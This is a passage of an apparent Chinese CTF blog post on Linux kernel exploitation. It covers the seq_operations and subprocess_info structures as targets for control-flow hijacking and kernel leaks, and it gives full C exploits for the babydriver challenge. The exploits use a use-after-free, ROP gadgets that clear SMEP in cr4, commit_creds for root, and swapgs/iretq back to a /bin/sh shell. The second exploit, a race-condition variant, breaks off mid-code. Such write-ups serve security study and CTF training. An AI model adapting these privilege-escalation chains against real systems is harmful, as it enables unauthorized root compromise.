<figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br></pre></td></tr></table></div></figure>



        <h1 id="seq-operations"   >
          <a href="#seq-operations" class="heading-link"><i class="fas fa-link"></i></a><a href="#seq-operations" class="headerlink" title="seq_operations"></a>seq_operations</h1>
      
        <h2 id="利用能力-2"   >
          <a href="#利用能力-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用能力-2" class="headerlink" title="利用能力"></a>利用能力</h2>
      
        <h3 id="控制流劫持-1"   >
          <a href="#控制流劫持-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#控制流劫持-1" class="headerlink" title="控制流劫持"></a>控制流劫持</h3>
      <p>在用户态执行<code>open(&quot;/proc/self/stat&quot;,0);</code>后，内核中的调用过程如下图所示：</p>
<p><img   src="image-20221231182402133.png?size=600" style="width: 600px;"  alt="image-20221231182402133"></p>
<p>内核中会调用<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/fs/seq_file.c#L565" >single_open()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>函数，而该函数中会为<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/seq_file.h#L36" >struct seq_operations</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 结构体申请一段内存空间（0x20字节大小）。</p>
<p><img   src="image-20221231182738559.png?size=600" style="width: 600px;"  alt="image-20221231182738559"></p>
<p><code>open()</code>操作后，用户态获得一个文件描述符fd。当用户态对该fd进行读操作<code>read(fd,buf,size)</code>时，在内核中会调用<code>seq_operations-&gt;start</code>函数指针，内核调用栈如下：</p>
<p><img   src="image-20221231185654243.png?size=600" style="width: 600px;"  alt="image-20221231185654243"></p>
<p>如果利用漏洞改掉结构体中的start函数指针，就能实现控制流劫持。</p>

        <h3 id="信息泄露-1"   >
          <a href="#信息泄露-1" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息泄露-1" class="headerlink" title="信息泄露"></a>信息泄露</h3>
      <p><code>seq_operations</code> 结构体中只含有4个函数指针，因此只能泄露内核基址，无法泄露出其他信息。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">	<span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">	<span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">	<span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>



        <h2 id="babydriver利用示例-2"   >
          <a href="#babydriver利用示例-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#babydriver利用示例-2" class="headerlink" title="babydriver利用示例"></a>babydriver利用示例</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="comment">// gcc test.c -static -masm=intel  -o test</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fd_stat;</span><br><span class="line"><span class="keyword">__uint64_t</span> temp_buf[<span class="number">4</span>];</span><br><span class="line"><span class="keyword">__uint64_t</span> pop_rax_ret = <span class="number">0xffffffff8101c216</span>;               <span class="comment">// pop rax ; ret</span></span><br><span class="line"><span class="keyword">__uint64_t</span> mov_rsp_rax_ret = <span class="number">0xffffffff818855cf</span>;           <span class="comment">// mov rsp, rax ; dec ebx ; jmp 0xffffffff8188558b</span></span><br><span class="line"><span class="keyword">__uint64_t</span> mov_cr4_rax_ret = <span class="number">0xffffffff8100f034</span>;        <span class="comment">// mov cr4,rax; pop rbp; ret</span></span><br><span class="line"><span class="keyword">__uint64_t</span> swapgs_ret = <span class="number">0xffffffff81885588</span>;             <span class="comment">// swapgs; ret</span></span><br><span class="line"><span class="keyword">__uint64_t</span> iretq = <span class="number">0xffffffff81884177</span>;                  <span class="comment">// iretq</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">__uint64_t</span> fake_stack[<span class="number">20</span>];</span><br><span class="line"><span class="keyword">__uint64_t</span> fake_stack_addr = &amp;fake_stack;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">__uint64_t</span> commit_creds = <span class="number">0xffffffff8106fed0</span>;</span><br><span class="line"><span class="keyword">__uint64_t</span> prepare_kernel_cred = <span class="number">0xffffffff81070260</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">void</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred;</span><br><span class="line">    <span class="keyword">int</span> (*cc)(<span class="keyword">void</span>*) = commit_creds; </span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;fake_stack_addr: 0x%llx\n&quot;</span>,fake_stack_addr);</span><br><span class="line">	<span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);</span><br><span class="line">	<span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>,<span class="number">2</span>);		</span><br><span class="line"></span><br><span class="line">	ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0x20</span>);				</span><br><span class="line">	close(fd1);									</span><br><span class="line"></span><br><span class="line">	fd_stat = open(<span class="string">&quot;/proc/self/stat&quot;</span>,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">__uint64_t</span> gadget1 = <span class="number">0xffffffff815f5951</span>;            <span class="comment">// add rsp,0x108; pop rbx; pop r12; pop r13; pop r14; pop r15; pop rbp; ret</span></span><br><span class="line">    write(fd2,&amp;gadget1,<span class="number">8</span>);</span><br><span class="line">    <span class="comment">// char* gadget1_addr = &quot;\x51\x59\x5f\x81\xff\xff\xff\xff\xff&quot;;</span></span><br><span class="line">    <span class="comment">// write(fd2,gadget1_addr,8);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 1. change rsp</span></span><br><span class="line">    <span class="comment">// 2. rc4 = 0x6f0</span></span><br><span class="line">    <span class="comment">// 3. swapgs;iret</span></span><br><span class="line">    <span class="comment">// 4. system(&quot;/bin/sh&quot;)</span></span><br><span class="line">    fake_stack[<span class="number">0</span>] = pop_rax_ret;</span><br><span class="line">    fake_stack[<span class="number">1</span>] = <span class="number">0x6f0</span>;</span><br><span class="line">    fake_stack[<span class="number">2</span>] = mov_cr4_rax_ret;</span><br><span class="line">    fake_stack[<span class="number">3</span>] = <span class="number">0xffff</span>;         <span class="comment">// rbp, padding</span></span><br><span class="line">    fake_stack[<span class="number">4</span>] = get_root;</span><br><span class="line">    fake_stack[<span class="number">5</span>] = swapgs_ret;</span><br><span class="line">    fake_stack[<span class="number">6</span>] = iretq;</span><br><span class="line">    fake_stack[<span class="number">7</span>] = get_shell;</span><br><span class="line">    fake_stack[<span class="number">8</span>] = user_cs;</span><br><span class="line">    fake_stack[<span class="number">9</span>] = user_rflags;</span><br><span class="line">    fake_stack[<span class="number">10</span>] = user_sp;</span><br><span class="line">    fake_stack[<span class="number">11</span>] =  user_ss;</span><br><span class="line"></span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r15, 0x15151515;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r14, 0x14141414;&quot;</span>      <span class="comment">// 4</span></span><br><span class="line">        <span class="string">&quot;mov r13, mov_rsp_rax_ret;&quot;</span>      <span class="comment">// 3</span></span><br><span class="line">        <span class="string">&quot;mov r12, fake_stack_addr;&quot;</span>      <span class="comment">// 2</span></span><br><span class="line">        <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r10, 0x10101010;&quot;</span>      <span class="comment">// r10</span></span><br><span class="line">        <span class="string">&quot;mov rbp, 0xbbbbbbbb;&quot;</span>      <span class="comment">// 5</span></span><br><span class="line">        <span class="string">&quot;mov rbx, pop_rax_ret;&quot;</span>      <span class="comment">// 1</span></span><br><span class="line">        <span class="string">&quot;mov r9, 0x99999999;&quot;</span>       <span class="comment">// r9</span></span><br><span class="line">        <span class="string">&quot;mov r8, 0x88888888;&quot;</span>       <span class="comment">//r8</span></span><br><span class="line">        <span class="string">&quot;mov rcx, 0xcccccccc;&quot;</span></span><br><span class="line">        <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdx, 0x20;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rsi, temp_buf;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, fd_stat;&quot;</span></span><br><span class="line">        <span class="string">&quot;syscall&quot;</span></span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    close(fd_stat);</span><br><span class="line">	close(fd2);		</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>


<p>同利用方法的题：</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/260055" >西湖论剑2021线上初赛easykernel题解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266897" >在 2021 年再看 ciscn_2017 - babydriver（下）：KPTI bypass、ldt_struct 的利用、pt_regs 通用内核ROP解法</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45566993/article/details/124791812" >kernel 劫持seq_operations &amp;&amp; 利用pt_regs</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>

        <h1 id="subprocess-info"   >
          <a href="#subprocess-info" class="heading-link"><i class="fas fa-link"></i></a><a href="#subprocess-info" class="headerlink" title="subprocess_info"></a>subprocess_info</h1>
      
        <h2 id="利用能力-3"   >
          <a href="#利用能力-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#利用能力-3" class="headerlink" title="利用能力"></a>利用能力</h2>
      
        <h3 id="控制流劫持-2"   >
          <a href="#控制流劫持-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#控制流劫持-2" class="headerlink" title="控制流劫持"></a>控制流劫持</h3>
      <p>当我们在用户态执行<code>socket(22, AF_INET, 0);</code> 时，内核调用栈如下图所示：</p>
<p><img   src="image-20221231175833470.png?size=600" style="width: 600px;"  alt="image-20221231175833470"></p>
<p>可以看到，内核中会调用到 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/kernel/kmod.c#L519" >call_usermodehelper_setup()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>函数，而该函数中会为 <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/kmod.h#L56" >struct subprocess_info</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 结构体申请一段内存空间（0x60字节大小）。</p>
<p><img   src="image-20221231174850423.png?size=600" style="width: 600px;"  alt="image-20221231174850423"></p>
<p>在<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/kernel/kmod.c#L69" >call_modprobe()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>成功调用<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/kernel/kmod.c#L519" >call_usermodehelper_setup()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>函数后，会继续调用<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/kernel/kmod.c#L555" >call_usermodehelper_exec()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> -&gt; <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/kernel/kmod.c#L191" >call_usermodehelper_freeinfo()</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>。最后这个函数中，调用了刚刚申请的 <code>subprocess_info</code> 结构体中存储的 <code>cleanup</code> 函数指针。如果能在申请 <code>subprocess_info</code>  结构体和使用 <code>cleanup</code> 函数指针的短暂时间间隔内，改写 <code>info-&gt;cleanup</code> ，那么就能达到控制流劫持的目的。</p>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">call_usermodehelper_freeinfo</span><span class="params">(struct subprocess_info *info)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (info-&gt;cleanup)</span><br><span class="line">		(*info-&gt;cleanup)(info);</span><br><span class="line">	kfree(info);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>
<p>如何利用这个短暂的时间窗口呢？答案当然离不开条件竞争！父线程不断调用<code>socket(22, AF_INET, 0);</code> 申请和释放 <code>subprocess_info</code> 结构体空间，子线程利用UAF或其他漏洞改写 <code>info-&gt;cleanup</code>  函数指针位置。这样，通过父子线程的配合，就有机会劫持控制流。</p>

        <h3 id="信息泄露-2"   >
          <a href="#信息泄露-2" class="heading-link"><i class="fas fa-link"></i></a><a href="#信息泄露-2" class="headerlink" title="信息泄露"></a>信息泄露</h3>
      <p><code>subprocess_info</code> 结构体中包含的内容较丰富：</p>
<ul>
<li>泄露内核基址：init、cleanup、work.func都是函数指针，且work.func可能指向<code>call_usermodehelper_exec_work()</code>，而init可能为空</li>
<li>泄露堆地址：work.entry链表头节点存储着堆地址，argv指向堆空间</li>
</ul>
<figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">subprocess_info</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">work</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">completion</span> *<span class="title">complete</span>;</span></span><br><span class="line">	<span class="keyword">char</span> *path;				<span class="comment">// 指向内核数据段，modprobe_path变量</span></span><br><span class="line">	<span class="keyword">char</span> **argv;</span><br><span class="line">	<span class="keyword">char</span> **envp;			<span class="comment">// 指向内核数据段，envp_35657静态变量</span></span><br><span class="line">	<span class="keyword">int</span> wait;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="keyword">int</span> (*init)(struct subprocess_info *info, struct cred *<span class="keyword">new</span>);</span><br><span class="line">	<span class="keyword">void</span> (*cleanup)(struct subprocess_info *info);</span><br><span class="line">	<span class="keyword">void</span> *data;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> &#123;</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span> data;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">entry</span>;</span></span><br><span class="line">	<span class="keyword">work_func_t</span> func;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></div></figure>



        <h2 id="babydriver利用示例-3"   >
          <a href="#babydriver利用示例-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#babydriver利用示例-3" class="headerlink" title="babydriver利用示例"></a>babydriver利用示例</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test.c</span></span><br><span class="line"><span class="comment">// gcc test.c --static -masm=intel -lpthread -o test</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> race_flag = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> fd1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">int</span> fd2 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">__uint64_t</span> target_buf[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">__uint64_t</span> xchg_esp_eax_ret = <span class="number">0xffffffff8100008a</span>;           <span class="comment">// xchg esp, eax ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">__uint64_t</span> pop_rax_ret = <span class="number">0xffffffff8101c216</span>;               <span class="comment">// pop rax ; ret</span></span><br><span class="line"><span class="keyword">__uint64_t</span> mov_cr4_rax_ret = <span class="number">0xffffffff8100f034</span>;        <span class="comment">// mov cr4,rax; pop rbp; ret</span></span><br><span class="line"><span class="keyword">__uint64_t</span> swapgs_ret = <span class="number">0xffffffff81885588</span>;             <span class="comment">// swapgs; ret</span></span><br><span class="line"><span class="keyword">__uint64_t</span> iretq = <span class="number">0xffffffff81884177</span>;                  <span class="comment">// iretq</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_rflags, user_sp, user_ss;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">__uint64_t</span> commit_creds = <span class="number">0xffffffff8106fed0</span>;</span><br><span class="line"><span class="keyword">__uint64_t</span> prepare_kernel_cred = <span class="number">0xffffffff81070260</span>;</span><br><span class="line"><span class="keyword">__uint64_t</span> init_cred_addr = <span class="number">0xffffffff81b79a60</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span>&#123;</span><br><span class="line">    race_flag = <span class="number">1</span>;                                      <span class="comment">// 条件竞争成功后，置flag</span></span><br><span class="line">    <span class="comment">// void* (*pkc)(int) = prepare_kernel_cred;         // 不知道为什么，执行这个函数过程中会报double fault的错误，而且貌似跟kmalloc有关</span></span><br><span class="line">    <span class="keyword">int</span> (*cc)(<span class="keyword">void</span>*) = commit_creds; </span><br><span class="line">    (*cc)(init_cred_addr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">race</span><span class="params">()</span></span>&#123;</span><br><span class="line">    target_buf[<span class="number">0</span>] = xchg_esp_eax_ret;</span><br><span class="line">    target_buf[<span class="number">1</span>] = <span class="number">0x11111111</span>;</span><br><span class="line"></span><br><span class="line">   	<span class="comment">// 控制流劫持时执行的指令是`call rax`，rax为xchg_esp_eax_ret，即0xffffffff8100008a。执行`xchg esp, eax ; ret`后，rsp变为`0x8100008a`，因此需要在0x8100008a处布置好ROP链</span></span><br><span class="line">    <span class="comment">// set esp area</span></span><br><span class="line">    <span class="keyword">__uint64_t</span> fake_stack_addr = ((<span class="keyword">__uint64_t</span>)xchg_esp_eax_ret &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    <span class="keyword">if</span>(mmap((<span class="keyword">char</span>*)(fake_stack_addr&amp;(~<span class="number">0xfff</span>)),<span class="number">0x2000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,<span class="number">-1</span>,<span class="number">0</span>) == MAP_FAILED)&#123;</span><br><span class="line">        perror(<span class="string">&quot;mmap failed.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">__uint64_t</span>* fake_stack_ptr = (<span class="keyword">__uint64_t</span>*)fake_stack_addr;</span><br><span class="line">    <span class="keyword">int</span> index = <span class="number">0</span>;</span><br><span class="line">    fake_stack_ptr[index++] = pop_rax_ret;</span><br><span class="line">    fake_stack_ptr[index++] = <span class="number">0x6f0</span>;</span><br><span class="line">    fake_stack_ptr[index++] = mov_cr4_rax_ret;</span><br><span class="line">    fake_stack_ptr[index++] = <span class="number">0xffff</span>; </span><br><span class="line">    fake_stack_ptr[index++] = get_root;</span><br><span class="line">    fake_stack_ptr[index++] = swapgs_ret;</span><br><span class="line">    fake_stack_ptr[index++] = iretq;</span><br><span class="line">    fake_stack_ptr[index++] = get_shell;</span><br><span class="line">    fake_stack_ptr[index++] = user_cs;</span><br><span class="line">    fake_stack_ptr[index++] = user_rflags;</span><br><span class="line">    fake_stack_ptr[index++] = user_sp;</span><br><span class="line">    fake_stack_ptr[index++] = user_ss;</span><br><span class="line"></span><br><span class="line">    <span 